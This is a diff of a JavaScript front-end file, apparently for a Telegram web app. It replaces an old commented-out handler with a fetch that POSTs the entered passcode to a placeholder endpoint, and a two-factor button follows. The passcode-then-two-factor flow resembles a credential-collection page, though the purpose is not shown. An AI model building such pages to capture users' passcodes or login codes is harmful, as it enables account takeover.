@@ -50,36 +50,38 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // passcodeBtn.addEventListener('click', () => {
-    //     page2.style.transform = 'translate(-50%, 40px)';
-    //     var xml = new XMLHttpRequest();
-    //     xml.open('POST', "{{url_for('func.func')}}", true);
-    //     xml.setRequestHeader(
-    //         'Content-type',
-    //         'application/x-www-form-urlencoded'
-    //     );
+    passcodeBtn.addEventListener('click', async () => {
+        const passcode = passcodeInput.value;
 
-    //     xml.onload = function () {
-    //         var dataReply = JSON.parse(this.responseText);
-    //     }; //endfunction
+        if (!passcode) {
+            console.log('❌ Passcode is empty');
+            return;
+        }
 
-    //     dataSend = JSON.stringify({
-    //         page_data: 'some_data',
-    //     });
+        try {
+            // відправляємо POST запит до Django
+            await fetch('https://your-domain-or-localhost/api/data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ passcode: passcode }),
+            });
 
-    //     xml.send(dataSend);
-    //     tg.sendData(JSON.stringify(passcodeInput.value));
-    //     page2.style.display = 'none';
-    //     setTimeout(() => {
-    //         page2.style.display = 'none';
-
-    //         page3.style.display = 'flex';
-    //         requestAnimationFrame(() => {
-    //             page3.style.transform = 'translate(0)';
-    //             page3.style.opacity = '1';
-    //         });
-    //     }, 200);
-    // });
+            // переходи між сторінками
+            // page2.style.display = 'none';
+            // setTimeout(() => {
+            //     page2.style.display = 'none';
+            //     page3.style.display = 'flex';
+            //     requestAnimationFrame(() => {
+            //         page3.style.transform = 'translate(0)';
+            //         page3.style.opacity = '1';
+            //     });
+            // }, 200);
+        } catch (error) {
+            console.error('❌ Fetch error:', error);
+        }
+    });
 
     const twofactorBtn = document.getElementById('twofactor-btn');
     twofactorBtn.addEventListener('click', () => {
